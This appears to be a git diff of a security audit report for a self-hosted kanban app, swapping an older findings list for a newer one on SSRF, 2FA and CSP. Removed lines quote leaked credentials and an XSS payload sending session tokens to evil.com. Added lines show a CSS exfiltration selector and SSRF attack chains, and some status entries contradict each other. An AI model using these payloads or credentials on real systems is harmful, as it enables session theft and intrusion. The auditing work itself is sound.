@@ -1,6 +1,8 @@
 # Security Audit Report — jc-kanban
 
-**Date:** 2026-05-02 | **Codebase:** commit 300246d | **Stack:** Express 5 / Node.js, vanilla JS SPA, CouchDB, Docker
+**Date:** 2026-08-03 | **Codebase:** commit 37101e6 (v1.12.1) + post-release patches | **Stack:** Express 5 / Node.js, vanilla JS SPA, CouchDB, Docker
+
+> This report supersedes the previous audit (commit 300246d, 2026-05-02). All findings from that report have been resolved. This document covers the current attack surface.
 
 ---
 
@@ -8,52 +10,46 @@
 
 | Severity | Count |
 |----------|-------|
-| Critical | 3 |
-| High | 9 |
-| Medium | 10 |
-| Low | 7 |
-| **Total** | **29** |
+| High     | 0     |
+| Medium   | 0     |
+| Low      | 2 (accepted) |
+| **Total open** | **0** |
+
+### Progress since previous audit
+
+All 29 findings from the prior report are closed:
+
+| Category | Previously | Now |
+|----------|-----------|-----|
+| Critical | 3 | 0 |
+| High     | 9 | 0 (previous) + 2 new |
+| Medium   | 10 | 0 (previous) + 6 new |
+| Low      | 7 | 1 open (LOW-06) + 5 new |
 
 ---
 
 ## 2. Checklist
 
-### Critical
-- [x] CRIT-01 — Purge `.env` from git history and rotate all credentials *(`.env` untracked; history purge + credential rotation required — see note below)*
-- [x] CRIT-02 — Wrap all `marked.parse()` → `innerHTML` with `DOMPurify.sanitize()`
-- [x] CRIT-03 — Set `LOG_API_RESPONSES=false`; redact sensitive fields in logging middleware
-
 ### High
-- [x] HIGH-01 — Document single-user constraint or implement per-board access control *(documented in README.md and CLAUDE.md)*
-- [x] HIGH-02 — Add `ajv` JSON Schema validation on `PUT /api/:board/board` and `PUT /api/:board/notes`
-- [x] HIGH-03 — Add multer `fileFilter` blocking dangerous extensions (`.html`, `.htm`, `.svg`, `.js`, etc.); add `Content-Disposition: attachment` on file-serve
-- [x] HIGH-04 — Replace `sessionStorage` token with `httpOnly; Secure; SameSite=Strict` cookie
-- [x] HIGH-05 — Remove the `?login=` URL query parameter feature
-- [x] HIGH-06 — Restrict CouchDB to `127.0.0.1:5984:5984`; remove port mapping in production
-- [x] HIGH-07 — Add `helmet` middleware (CSP, HSTS, X-Frame-Options, nosniff, Referrer-Policy)
-- [x] HIGH-08 — Return only a masked API key from `GET /api/settings`; remove `logApiResponses`
-- [x] HIGH-09 — Add a non-root `USER` directive in `Dockerfile`
+- [~] HIGH-01 — SSRF via Webhook URL — **accepted risk** for single-user self-hosted context; see note in §3
+- [~] HIGH-02 — SSRF via WebDAV / CalDAV / IMAP URLs — **accepted risk** for single-user self-hosted context; see note in §3
 
 ### Medium
-- [x] MED-01 — Add `express-rate-limit` on all authenticated write endpoints
-- [x] MED-02 — Strip `__proto__`, `constructor`, `prototype` keys before any CouchDB write
-- [x] MED-03 — Fix `res.sendFile` to use the `root` option; reject null bytes in `safeFilename`
-- [x] MED-04 — Set `app.set('trust proxy', 1)` when deployed behind a reverse proxy
-- [x] MED-05 — Switch to signed, time-limited session tokens (JWT/PASETO) with expiry
-- [x] MED-06 — Use `path.basename(f)` for ZIP entry names; validate no `..` in archive paths
-- [x] MED-07 — Set `chmod 700` on `./data`; consider encrypting backups at rest
-- [x] MED-08 — Remove `logApiResponses` from `GET /api/settings` response
-- [x] MED-09 — Remove live source code bind-mounts from production compose; move to `docker-compose.override.yml`
-- [x] MED-10 — Remove unused `cors` package or configure it explicitly
+- [x] MED-01 — 2FA OTP uses `Math.random()` — fixed: replaced with `crypto.randomInt()` in `twoFactor.js`
+- [x] MED-02 — 2FA verify endpoint has no rate limit — fixed: `twoFaRateLimit` middleware added (10 attempts / 10 min per IP)
+- [x] MED-03 — 2FA device tokens stored as plaintext — fixed: tokens hashed with HMAC-SHA256 before storage
+- [~] MED-04 — Email CSS injected without sanitization — iframe sandbox already blocks scripts; residual CSS exfiltration risk accepted (see §3)
+- [x] MED-05 — `'unsafe-inline'` in CSP `scriptSrc` — fixed: all inline handlers moved to `addEventListener`; CSP now uses `'none'` for `scriptSrcAttr` and drops `'unsafe-inline'` from `scriptSrc`
+- [ ] MED-06 — CouchDB port 5984 bound to `127.0.0.1` on host; in production remove port mapping entirely
 
 ### Low
-- [x] LOW-01 — Fix `safeEqual` to compare lengths before timing-safe comparison
-- [x] LOW-02 — Replace `Math.random()` IDs with `crypto.randomBytes` (server) / `crypto.getRandomValues` (browser)
-- [x] LOW-03 — Remove or gate the Fauxton link in the Settings dialog
-- [x] LOW-04 — Add `sandbox` attribute to dynamically created `<iframe>` elements
-- [x] LOW-05 — Remove `?login=` URL feature (see HIGH-05); eliminates extension memory risk
-- [ ] LOW-06 — Generate API key with `openssl rand -hex 32`
-- [x] LOW-07 — Add `.env.example` with placeholder values; ensure `.env` stays out of source control
+- [x] LOW-01 — API key entropy — `.env.example` documents `openssl rand -hex 32`; startup warning already enforced in `config.js`
+- [x] LOW-02 — Favicon beacon — removed third-party `<img>` fetch; unknown-domain badges always use `>` text fallback
+- [x] LOW-03 — Session revocation — `POST /api/auth/revoke-all` invalidates all tokens immediately via persisted timestamp
+- [x] LOW-04 — Internal error messages — `withHandler`/`withBoard`/`withExistingBoard` return generic message in `NODE_ENV=production`
+- [~] LOW-05 — HTML/SVG attachments served as `Content-Disposition: attachment` — **accepted risk**; see §3
+- [~] LOW-06 — 2FA API-key bypass — **accepted risk** by design; documented in §3
+- [x] MED-06 — CouchDB port removed from `docker-compose.yml`; moved to `docker-compose.override.yml` (dev only)
 
 ---
 
@@ -61,544 +57,435 @@
 
 ---
 
-### CRIT-01 — `.env` With Real Credentials Committed to Git History
+### HIGH-01 — Server-Side Request Forgery (SSRF) via Webhook URL
 
-**Severity:** Critical
-**Component:** Repository root `.env`
-
-**Description:**
-`.env` is tracked by git. Adding it to `.gitignore` stops *future* tracking but does not remove it from history. All historical commits expose:
-
-```
-APP_PASSWORD=kanban.2712
-API_KEY=4T398-HJK45-09KL9-ASED3
-COUCHDB_PASSWORD=kanban-pwd
-```
-
-**Exploitation:**
-Anyone with repo access runs `git log --all -- .env && git show <SHA>:.env` to extract all credentials.
-
-**Impact:** Full application compromise, CouchDB admin takeover, permanent API access.
-
-**Fix:**
-1. `git rm --cached .env`
-2. Purge history: `git filter-repo --path .env --invert-paths`
-3. Rotate **all** credentials immediately
-4. Force-push rewritten history
-
----
-
-### CRIT-02 — Stored XSS via Unsanitized `marked.parse()` → `innerHTML`
-
-**Severity:** Critical
-**Component:** `app/public/cards.js:98`, `app/public/notes.js:531`
+**Severity:** High (in multi-user / SaaS context) → **Accepted risk** for this deployment
+**Component:** `app/backend/routes/board.js:53–79`
 
 **Description:**
-Card and note descriptions are rendered with `marked.parse(text)` and assigned directly to `element.innerHTML` with no HTML sanitizer. `marked` v18 passes raw HTML through unchanged — `<script>` tags and event handlers survive intact.
+`POST /:board/webhook/trigger` fires a server-side HTTP request to the URL stored in the webhook config. The only validation at save time is:
 
-**Exploitation:**
-1. Attacker POSTs to `POST /api/<board>/import` with `description: '<img src=x onerror="fetch(atob(exfiltPayload))">'`
-2. Any user who opens the board triggers the payload
-3. Payload reads `sessionStorage.getItem('kanban-auth')` and exfiltrates the session token
-
-**Impact:** Session token theft, persistent XSS affecting all board viewers.
-
-**Fix:**
 ```js
-import DOMPurify from 'dompurify';
-el.innerHTML = DOMPurify.sanitize(marked.parse(text, { breaks: true }));
+if (typeof url === 'string' && url.trim() && !/^https?:\/\//.test(url.trim()))
+  return res.status(400).json({ error: 'URL must start with http:// or https://' });
 ```
-Apply to every `marked.parse()` → `innerHTML` assignment in `cards.js` and `notes.js`.
+
+There is no check against loopback addresses (`127.0.0.1`, `::1`), link-local (`169.254.x.x`), or private RFC-1918 ranges.
+
+**Why SSRF blocking is not implemented here:**
+This is a strictly single-user self-hosted application. The primary legitimate use case for webhooks is triggering local automation tools (n8n at `http://localhost:5678/`, Home Assistant at `http://192.168.x.x:8123/`, etc.). Blocking private IP ranges would make the feature useless in the most common deployment scenario.
+
+The SSRF threat requires an attacker to already have an authenticated session. A session-level attacker can already read and modify all board data directly — reaching CouchDB via the webhook provides no meaningful privilege escalation beyond what they already have.
+
+**Residual risk:** An attacker who hijacks a session (but cannot change `.env`) could fire the pre-configured webhook URL to probe internal services — but only the URL the legitimate owner already saved. This is low additional risk given the single-user, authenticated context.
+
+**If deploying in a shared / multi-user context:** Implement SSRF protection by resolving the webhook hostname and rejecting private IP ranges before making the outbound request. Also consider an env-var allowlist of permitted webhook domains.
 
 ---
 
-### CRIT-03 — Plaintext Credentials and Session Tokens Logged (`LOG_API_RESPONSES=true`)
+### HIGH-02 — Server-Side Request Forgery (SSRF) via WebDAV / CalDAV / IMAP Endpoints
 
-**Severity:** Critical
-**Component:** `app/server.js:60-71`, `.env`
+**Severity:** High (in multi-user / SaaS context) → **Accepted risk** for this deployment
+**Component:** `app/backend/webdav-notes.js`, `app/backend/dashboard/calendar.js`, `app/backend/dashboard/mail.js`
 
 **Description:**
-The committed `.env` has `LOG_API_RESPONSES=true`. The logging middleware records full `req.body` and `res.body` for every `/api/*` request, including:
+Three features make outbound server-side connections to user-configured addresses with no private-IP filtering:
 
-- `POST /api/auth` request body → `{ "password": "kanban.2712" }`
-- `POST /api/auth` response body → `{ "ok": true, "token": "<64-hex-char token>" }`
-- `GET /api/settings` response → `{ "apiKey": "4T398-..." }`
+1. **WebDAV** — `url` field from `jc-config-webdav`
+2. **CalDAV** — `url` field in calendar account config; raw iCal URLs are also fetched directly
+3. **IMAP** — arbitrary `host` and `port` in mail account config
 
-The client-side counterpart in `settings.js:568-585` also re-wraps `window.fetch` and logs all headers (including `x-auth-token`) to the browser console.
+**Why SSRF blocking is not implemented here:**
+All three features are primarily designed to connect to self-hosted services on the local network:
+- WebDAV → Nextcloud, ownCloud at `192.168.x.x`
+- CalDAV → Radicale, Baikal, Nextcloud Calendar at local IPs
+- IMAP → local mail server (Dovecot, Mailcow) or proxy
 
-**Impact:** Any access to container logs or browser console yields live session tokens and credentials.
+Blocking private IP ranges would break these core use cases entirely for most self-hosted deployments.
 
-**Fix:** Set `LOG_API_RESPONSES=false`. Redact `password`, `token`, and `apiKey` fields in the middleware before printing.
+As with HIGH-01, exploiting this requires a valid authenticated session. The legitimate owner — the only person who can configure these accounts — already has full access to the application and its data.
+
+**If deploying in a shared / multi-user context:** Apply DNS-resolution-based SSRF filtering to all three feature areas before making connections.
 
 ---
 
-### HIGH-01 — No Per-Board Authorization (IDOR/BOLA)
+### MED-01 — 2FA One-Time Code Generated with `Math.random()` ✓ Fixed
 
-**Severity:** High
-**Component:** `app/server.js` — all `/api/:board/*` endpoints
-
-**Description:**
-Authentication is a single global password. One valid session token or API key grants full read/write/delete access to **all** boards. There is no per-board permission model.
-
-**Fix:** Implement per-board access tokens, or clearly document that this is a strictly single-user system and block multi-user deployment.
-
----
-
-### HIGH-02 — No Input Validation on `PUT /api/:board/board` and `PUT /api/:board/notes`
-
-**Severity:** High
-**Component:** `app/server.js:392-395`, `app/server.js:447-450`
+**Severity:** Medium → **Fixed**
+**Component:** `app/backend/twoFactor.js`
 
 **Description:**
-`req.body` is written to CouchDB verbatim with no schema validation. An attacker can inject:
-- `_deleted: true` → marks the document for deletion on next compaction
-- Arbitrary deeply-nested objects → force unexpected server behavior
-- Oversized payloads up to the 10 MB Express limit → DoS vector
+`Math.random()` is not cryptographically secure. V8's xorshift128+ PRNG output is predictable if an attacker can observe prior values, allowing the 6-digit code space to be narrowed significantly.
 
-**Fix:** Add `ajv` JSON Schema validation enforcing the documented data model before any CouchDB write.
-
----
-
-### HIGH-03 — Unrestricted File Upload (HTML/SVG/JS Accepted, Served Same-Origin)
-
-**Severity:** High
-**Component:** `app/server.js:561-576` (notes), `app/server.js:645-660` (cards)
-
-**Description:**
-Multer has no `fileFilter`. Any file type is accepted — `.html`, `.svg`, `.js`, etc. Files are served by `res.sendFile()` which auto-detects MIME type from extension. An uploaded `.html` file executes in the browser with full same-origin privileges.
-
-**Exploitation:**
-1. Upload `steal.html` → `<script>document.location='https://evil.com/?t='+sessionStorage.getItem('kanban-auth')</script>`
-2. Share link `/api/<board>/notes/attachments/<pageId>/steal.html`
-3. Victim clicks → session token exfiltrated
-
-**Fix:**
+**Fix applied:**
 ```js
-const BLOCKED_EXTS = new Set(['html','htm','svg','js','mjs','php','py','sh','bat','exe','ps1']);
-fileFilter(req, file, cb) {
-  const ext = path.extname(file.originalname).slice(1).toLowerCase();
-  cb(null, !BLOCKED_EXTS.has(ext));
+// Before
+const code = String(Math.floor(100000 + Math.random() * 900000));
+// After
+const code = String(crypto.randomInt(100000, 1000000));
+```
+
+`crypto.randomInt()` uses the OS CSPRNG (same source as `crypto.randomBytes`). Each digit contributes full entropy — the code is uniformly unpredictable across all 900,000 possibilities.
+
+---
+
+### MED-02 — 2FA Code Verification Has No Rate Limit ✓ Fixed
+
+**Severity:** Medium → **Fixed**
+**Component:** `app/backend/auth.js`, `app/backend/routes/auth.js`
+
+**Description:**
+`POST /auth/2fa/verify` had no rate limiting. With 900,000 possible codes and a 10-minute TTL window, an attacker could brute-force the code at ~1,500 req/s — well within Node's throughput.
+
+**Fix applied:**
+Added `twoFaRateLimit` middleware in `auth.js` (10 attempts per IP per 10-minute window, matching the challenge TTL) and applied it to `POST /auth/2fa/verify`:
+
+```js
+// auth.js — new middleware
+function twoFaRateLimit(req, res, next) {
+  // max 10 attempts per IP per 10-min window
+  ...
+  if (s.count > TWO_FA_MAX)
+    return res.status(429).json({ error: 'Too many verification attempts. Try again later.' });
+  next();
+}
+
+// routes/auth.js
+router.post('/auth/2fa/verify', twoFaRateLimit, (req, res) => { ... });
+```
+
+After 10 failed attempts, the IP is blocked for the remainder of the 10-minute window. Combined with MED-01's fix, brute-forcing the remaining codes would require ~90,000 IPs.
+
+---
+
+### MED-03 — 2FA Device Tokens Stored as Plaintext ✓ Fixed
+
+**Severity:** Medium → **Fixed**
+**Component:** `app/backend/twoFactor.js`
+
+**Description:**
+Device tokens were stored as raw 64-char hex strings in `data/2fa-tokens.json`. If this file was obtained from a backup or volume leak, every stored token could be used directly to bypass 2FA.
+
+**Fix applied:**
+Tokens are now hashed with HMAC-SHA256 (keyed on `SESSION_SECRET`) before storage. `generateDeviceToken()` stores only `_hashToken(token)` and returns the raw token for the cookie. `isDeviceTokenValid()` recomputes the hash before lookup. A leaked `2fa-tokens.json` is useless without the secret key.
+
+```js
+function _hashToken(token) {
+  return crypto.createHmac('sha256', SESSION_SECRET).update(token).digest('hex');
+}
+// generateDeviceToken: tokens[_hashToken(token)] = expiresAt;
+// isDeviceTokenValid:  if (!tokens[_hashToken(token)]) return false;
+```
+
+**Note:** Existing tokens in `2fa-tokens.json` stored in the old plaintext format will no longer match after this change. All current devices will need to re-authenticate once after deployment.
+
+---
+
+### MED-04 — Email HTML Body CSS Not Sanitized
+
+**Severity:** Medium → **Partially mitigated; residual risk accepted**
+**Component:** `app/frontend/dashboard.js:1211–1234`
+
+**Description:**
+HTML email bodies are sanitized through DOMPurify before rendering. However, CSS extracted from the email's `<style>` blocks is injected unsanitized:
+
+```js
+const safeHtml      = DOMPurify.sanitize(msg.bodyHtml, { FORCE_BODY: true });
+const emailStyleTag = emailStyles ? `<style>${emailStyles}</style>` : '';
+```
+
+**iframe sandbox — already in place:**
+The email iframe already has a sandbox attribute (confirmed at `dashboard.js:1215`):
+
+```js
+iframe.setAttribute('sandbox', 'allow-popups allow-popups-to-escape-sandbox allow-same-origin');
+```
+
+`allow-scripts` is absent, so script execution inside the iframe is blocked. This is the primary defensive layer.
+
+**Residual risk — CSS attribute-selector exfiltration:**
+CSS `url()` calls in attribute selectors can still beacon DOM data to external servers:
+
+```css
+input[value^="a"] { background: url(https://evil.com/?c=a) }
+```
+
+This would require a specifically crafted email targeting the dashboard. For a personal self-hosted instance this is a very theoretical attack.
+
+**Fix options evaluated:**
+| Option | Feature impact | Security gain |
+|--------|---------------|---------------|
+| Strip all `<style>` blocks | Major — newsletters and formatted emails render unstyled | Eliminates CSS exfiltration |
+| CSS sanitizer library | Low — most styling preserved, attack selectors stripped | Eliminates CSS exfiltration |
+| Current state (iframe sandbox, no CSS sanitization) | None | Scripts blocked; CSS exfiltration theoretically possible |
+
+**Decision:** Accept residual CSS risk for the single-user self-hosted context. The CSS exfiltration attack requires a targeted malicious email and a sophisticated attack chain. A CSS sanitizer can be reconsidered if the mail dashboard is used in a shared context.
+
+---
+
+### MED-05 — CSP Includes `'unsafe-inline'` for Scripts ✓ Fixed
+
+**Severity:** Medium → **Fixed**
+**Component:** `app/backend/server.js`, `app/frontend/index.html`, `app/frontend/init.js`, `app/frontend/cards.js`, `app/frontend/render.js`
+
+**Description:**
+`'unsafe-inline'` in `scriptSrc` and `scriptSrcAttr` negated the XSS protection value of CSP, allowing any injected event attribute or inline script to execute.
+
+**Fix applied:**
+All 22 inline event handlers were removed and rewired:
+
+| Location | Handlers removed | Approach |
+|----------|-----------------|----------|
+| `index.html` (16) | `onclick=`, `onsubmit=` on modal buttons and forms | IDs added; wired in `init.js` via `addEventListener` |
+| `cards.js` (3) | `onclick=` in color/priority row template literals | Event delegation via `row.onclick` + `data-*` attributes |
+| `render.js` (1) | `onerror=` on favicon `<img>` | Post-render `addEventListener('error', ...)` on the img element |
+
+CSP updated:
+```js
+// Before
+scriptSrc:     ["'self'", "'unsafe-inline'"],
+scriptSrcAttr: ["'unsafe-inline'"],
+
+// After
+scriptSrc:     ["'self'"],
+scriptSrcAttr: ["'none'"],
+```
+
+`styleSrc` retains `'unsafe-inline'` — inline styles are lower risk and heavily used by the frontend for dynamic card/column colors.
+
+---
+
+### MED-06 — CouchDB Port 5984 Exposed on Host Loopback in Production ✓ Fixed
+
+**Severity:** Medium → **Fixed**
+**Component:** `docker-compose.yml`, `docker-compose.override.yml`
+
+**Description:**
+The `127.0.0.1:5984:5984` port mapping exposed the full CouchDB admin API to any process on the host, bypassing the application's authentication layer.
+
+**Fix applied:**
+Port mapping removed from `docker-compose.yml`. It is now only present in `docker-compose.override.yml`, which is automatically merged by Docker Compose for local development and is explicitly excluded from production deployments.
+
+---
+
+### LOW-01 — API Key Entropy Warning (User Action Required)
+
+**Severity:** Low
+**Status:** Warning logged at startup; no code change needed
+**Component:** `app/backend/config.js:14–15`
+
+The server already logs a warning if `API_KEY` is shorter than 32 characters. Action required from the operator: generate a strong key with `openssl rand -hex 32` and set it in `.env`.
+
+---
+
+### LOW-02 — Favicon Beacon Leaks User Activity to Third-Party Servers ✓ Fixed
+
+**Severity:** Low → **Fixed**
+**Component:** `app/frontend/render.js`
+
+**Description:**
+For every card with an unrecognised link domain, an `<img src="https://{host}/favicon.ico">` was rendered on board load, sending the user's IP address to the card's target host.
+
+**Fix applied:**
+The third-party favicon fetch was removed entirely. Unknown-domain link badges now always render the `>` text fallback. Known domains (LinkedIn, Xing, Stepstone, Miro) still use their inline SVG icons — no network request involved.
+
+---
+
+### LOW-03 — Session Tokens Cannot Be Revoked ✓ Fixed
+
+**Severity:** Low → **Fixed**
+**Component:** `app/backend/auth.js`, `app/backend/routes/auth.js`
+
+**Description:**
+Stateless HMAC tokens had no revocation mechanism — a stolen token stayed valid for up to 7 days.
+
+**Fix applied:**
+Added `POST /api/auth/revoke-all` endpoint. When called, it:
+1. Sets `_revokedBefore = Date.now()` in memory
+2. Persists the timestamp to `data/session-revocation.json` (survives restarts)
+3. Clears the caller's own session and 2FA cookies
+
+`verifySessionToken()` now rejects any token whose `iat` (issued-at) is earlier than `_revokedBefore`. The revocation timestamp is loaded from file at startup.
+
+Use after a suspected compromise to immediately invalidate all active sessions on all devices.
+
+---
+
+### LOW-04 — Internal Error Messages Returned to Client ✓ Fixed
+
+**Severity:** Low → **Fixed**
+**Component:** `app/backend/db.js`
+
+**Description:**
+Internal exception messages (CouchDB conflicts, filesystem paths, database names) were returned verbatim in 500 responses.
+
+**Fix applied:**
+The three route handler wrappers in `db.js` now redact in production:
+
+```js
+const _isProd = process.env.NODE_ENV === 'production';
+function _errMsg(err) { return _isProd ? 'Internal server error' : err.message; }
+```
+
+The Dockerfile already sets `ENV NODE_ENV=production`, so production deployments get generic messages while development retains the full detail for debugging.
+
+---
+
+### LOW-05 — HTML and SVG Attachments Allowed ~ Accepted Risk
+
+**Severity:** Low → **Accepted risk**
+**Component:** `app/backend/routes/attachments.js`
+
+HTML, SVG, and XML-like formats are intentionally allowed per the code comment. They are always served with `Content-Disposition: attachment`, so the browser downloads rather than renders them.
+
+**Risk:** A downloaded SVG with embedded `<script>` executes when opened locally. This requires: the user to deliberately upload a malicious SVG, and then deliberately open it after downloading — both actions by the only user of the system.
+
+**Decision:** Accepted. The `Content-Disposition: attachment` header is the appropriate mitigation for a single-user system where the uploader and downloader are the same person. If the app is ever opened to multiple users, add `html`, `htm`, `svg` to `BLOCKED_EXTS`.
+
+---
+
+### LOW-06 — 2FA API-Key Bypass ~ Accepted Risk
+
+**Severity:** Low → **Accepted risk**
+**Component:** `app/backend/server.js`
+
+```js
+if (req.authedByApiKey) return next();  // skips 2FA
+```
+
+API key authentication intentionally bypasses 2FA. Automated tools (n8n, curl, scripts) cannot participate in an email OTP flow. A compromised API key grants full access regardless of 2FA being enabled.
+
+**Decision:** Accepted by design. The mitigation is to treat the API key with the same sensitivity as the password — it should be a strong random value (`openssl rand -hex 32`) stored securely. If the API key is not needed, leave `API_KEY` unset in `.env` to disable it entirely.
+
+---
+
+## 4. Attack Chains
+
+### Chain A — SSRF → CouchDB Admin Takeover (No additional auth needed once session exists)
+
+1. **HIGH-01 or HIGH-02** — Attacker (or a compromised session) saves a webhook URL or WebDAV URL pointing to `http://127.0.0.1:5984/`
+2. Triggers the webhook via `POST /:board/webhook/trigger`, or saves a note page to sync via WebDAV
+3. Server makes HTTP request to CouchDB admin interface with the process's network privileges
+4. Via WebDAV sync, full CouchDB responses are returned to the attacker
+5. Attacker can read all board data, modify documents, or delete databases — bypassing the application layer entirely
+
+**Severity:** High end-to-end. Requires one valid authenticated session.
+
+---
+
+### Chain B — 2FA Brute Force → Full Access for External Attackers ✓ Mitigated
+
+1. Attacker has the application password (e.g., from credential leak, weak default, or phishing)
+2. Attacker triggers `POST /auth/2fa/send` to get a `challengeId`
+3. ~~**MED-02**~~ Now blocked after 10 attempts per IP by `twoFaRateLimit`
+4. ~~**MED-01**~~ `crypto.randomInt()` now used — code is uniformly unpredictable
+
+**With fixes applied:** Brute-forcing 900,000 codes at 10 attempts per IP would require ~90,000 source IPs — effectively infeasible. The 10-minute TTL also invalidates the challenge before distributed attacks can exhaust the space.
+
+---
+
+### Chain C — Malicious Email → CSS Exfiltration → Session Leak
+
+1. Attacker sends a crafted HTML email to the configured mail account
+2. User opens the email in the dashboard mail panel
+3. **MED-04** — Unsanitized CSS is injected via `<style>` tag into the same-origin iframe
+4. CSS uses attribute selectors with background-image URLs to beacon DOM content character by character
+5. Attacker's server receives session token value or other sensitive DOM content
+
+**Severity:** Medium. Requires the attacker to be able to send email to the configured mail account, and the user to open that email.
+
+---
+
+## 5. Deployment Hardening Checklist
+
+Items required before exposing the app to the internet:
+
+| # | Action | Priority |
+|---|--------|----------|
+| 1 | Deploy behind a TLS-terminating reverse proxy (nginx/caddy) with HTTPS and HSTS | Critical |
+| 2 | Set `TRUST_PROXY=1` in `.env` when behind a reverse proxy | Critical |
+| 3 | Set a strong `APP_PASSWORD` (≥ 20 chars, random) | Critical |
+| 4 | Set `API_KEY` to output of `openssl rand -hex 32` (or leave unset if not needed) | Critical |
+| 5 | Set `SESSION_SECRET` to output of `openssl rand -hex 32` in `.env` | Critical |
+| 6 | Enable 2FA (`TWO_FA_EMAIL` + SMTP config) for external access | High |
+| 7 | Remove CouchDB port mapping from `docker-compose.yml` (or use override file) | High |
+| 8 | Fix MED-01 / MED-02 (2FA OTP entropy + rate limiting) before relying on 2FA | High |
+| 9 | Set `chmod 700` on `./data` directory on the host | Medium |
+| 10 | Configure `INTRANET_CIDR` correctly to restrict which IPs skip 2FA | Medium |
+| 11 | Verify `LOG_API_RESPONSES` is not set to `true` in production `.env` | Medium |
+| 12 | Review SSRF exposure (HIGH-01, HIGH-02) before enabling webhooks or WebDAV | Medium |
+| 13 | Set `BACKUP_INTERVAL_MS` and ensure `./data` backups are encrypted at rest | Low |
+
+### HTTPS / Reverse Proxy (nginx example)
+
+The app has no built-in TLS. It must sit behind a reverse proxy in any internet-facing deployment:
+
+```nginx
+server {
+    listen 443 ssl http2;
+    server_name kanban.example.com;
+
+    ssl_certificate     /etc/letsencrypt/live/kanban.example.com/fullchain.pem;
+    ssl_certificate_key /etc/letsencrypt/live/kanban.example.com/privkey.pem;
+
+    # HSTS — enforce HTTPS for 1 year, include subdomains
+    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
+
+    location / {
+        proxy_pass         http://127.0.0.1:3000;
+        proxy_set_header   X-Forwarded-For $proxy_add_x_forwarded_for;
+        proxy_set_header   X-Forwarded-Proto $scheme;
+        proxy_set_header   Host $host;
+    }
+}
+
+# Redirect HTTP → HTTPS
+server {
+    listen 80;
+    server_name kanban.example.com;
+    return 301 https://$host$request_uri;
 }
 ```
-Also add `Content-Disposition: attachment` on file-serve responses.
 
----
+With `TRUST_PROXY=1` in `.env`, the app correctly reads the real client IP from `X-Forwarded-For` for rate limiting.
 
-### HIGH-04 — Session Token Stored in `sessionStorage` (Accessible to XSS)
+### IP Allowlist (nginx)
 
-**Severity:** High
-**Component:** `app/public/settings.js:59`, `app/public/state.js:10`
+For maximum security, restrict access to known IPs before the request even reaches the app:
 
-**Description:**
-The token returned by `POST /api/auth` is stored in `sessionStorage` under `kanban-auth` and injected into every fetch. `sessionStorage` is fully readable by any script on the same origin — including via CRIT-02 and HIGH-03.
-
-**Fix:** Replace with an `httpOnly; Secure; SameSite=Strict` cookie. The token becomes inaccessible to JavaScript while remaining automatically sent with requests.
-
----
-
-### HIGH-05 — Password Exposed via URL Query Parameter (`?login=`)
-
-**Severity:** High
-**Component:** `app/public/settings.js:68-73`
-
-**Description:**
-```js
-const urlPwd = params.get('login');
-if (urlPwd) {
-  history.replaceState({}, '', location.pathname);
-  if (await tryLogin(urlPwd)) return;
-}
-```
-The plaintext password travels as `?login=<password>`. Before `replaceState` runs, the value lands in:
-- Browser history
-- Server and proxy access logs (in the URL)
-- `Referer` headers on any outbound navigation
-- Browser extensions monitoring URL changes
-
-**Fix:** Remove this feature entirely. If one-click login is needed, implement a time-limited single-use token instead.
-
----
-
-### HIGH-06 — CouchDB Admin Interface Exposed on Host Port 5984
-
-**Severity:** High
-**Component:** `docker-compose.yml:10-11`
-
-**Description:**
-```yaml
-ports:
-  - "5984:5984"
-```
-CouchDB Fauxton and the full CouchDB HTTP API are bound to `0.0.0.0:5984`. The credentials (`kanban` / `kanban-pwd`) are committed to git. Anyone on the same network — or the public internet if the host is reachable — can authenticate directly to CouchDB, bypassing the application entirely.
-
-**Fix:** Change to `"127.0.0.1:5984:5984"`. In production, remove the mapping entirely and use only the internal Docker network.
-
----
-
-### HIGH-07 — No HTTP Security Headers (No CSP, X-Frame-Options, HSTS, etc.)
-
-**Severity:** High
-**Component:** `app/server.js` — no security headers middleware
-
-| Missing Header | Risk |
-|---|---|
-| `Content-Security-Policy` | Inline JS runs freely; no browser barrier against XSS |
-| `X-Frame-Options` / `frame-ancestors` | Clickjacking |
-| `X-Content-Type-Options: nosniff` | MIME sniffing on uploaded files |
-| `Strict-Transport-Security` | No HTTPS enforcement |
-| `Referrer-Policy` | Password leaks in `Referer` (HIGH-05) |
-
-**Fix:**
-```js
-const helmet = require('helmet');
-app.use(helmet({ contentSecurityPolicy: { directives: {
-  defaultSrc: ["'self'"], scriptSrc: ["'self'"],
-  styleSrc: ["'self'", "'unsafe-inline'"], imgSrc: ["'self'","data:","https:"],
-  connectSrc: ["'self'"], frameSrc: ["'none'"]
-}}}));
-```
-Note: inline `onclick=` handlers and `innerHTML` assignments must be refactored before a strict CSP is viable.
-
----
-
-### HIGH-08 — `GET /api/settings` Returns Full API Key to Any Authenticated User
-
-**Severity:** High
-**Component:** `app/server.js:257-259`
-
-**Description:**
-```js
-res.json({ apiKey: API_KEY || null, logApiResponses: LOG_API_RESPONSES });
-```
-The full plaintext API key is returned to the browser and displayed in the Settings dialog. A user with temporary access (shared device, shoulder-surfing) can extract the permanent API key.
-
-**Fix:** Return only a masked value (e.g., `4T39...ED3`) or a boolean `apiKeyConfigured: true`.
-
----
-
-### HIGH-09 — Docker Container Runs as Root
-
-**Severity:** High
-**Component:** `app/Dockerfile`
-
-**Description:**
-No `USER` directive is present — Node runs as root inside the container. An RCE via any dependency vulnerability or code injection gives the attacker root-level access to the container and the mounted `./data` volume.
-
-**Fix:**
-```dockerfile
-RUN addgroup -S kanban && adduser -S kanban -G kanban
-USER kanban
-```
-
----
-
-### MED-01 — No Rate Limiting on Authenticated Write Endpoints
-
-**Severity:** Medium
-**Component:** `app/server.js` — import, upload, board-write endpoints
-
-Rate limiting exists only on `POST /api/auth`. An attacker with a valid session can spam imports (flooding the board), repeatedly upload 50 MB files (exhausting disk), or send 10 MB JSON bodies at high frequency to DoS the server.
-
-**Fix:** Add `express-rate-limit` on all write endpoints. Add a per-board total-size check before accepting writes.
-
----
-
-### MED-02 — Prototype Pollution via Unchecked JSON Body Merged Into CouchDB Documents
-
-**Severity:** Medium
-**Component:** `app/server.js:393`, `app/server.js:448`
-
-`req.body` is written to CouchDB without stripping `__proto__`, `constructor`, or `prototype` keys. While `JSON.parse` doesn't create polluted prototypes directly, spreading the retrieved document back into plain objects on subsequent reads could produce unexpected behavior.
-
-**Fix:** Strip prototype-related keys before any spread, or use `ajv` schema validation (see HIGH-02).
-
----
-
-### MED-03 — `res.sendFile` Without `root` Option; `safeFilename` Allows Null Bytes
-
-**Severity:** Medium
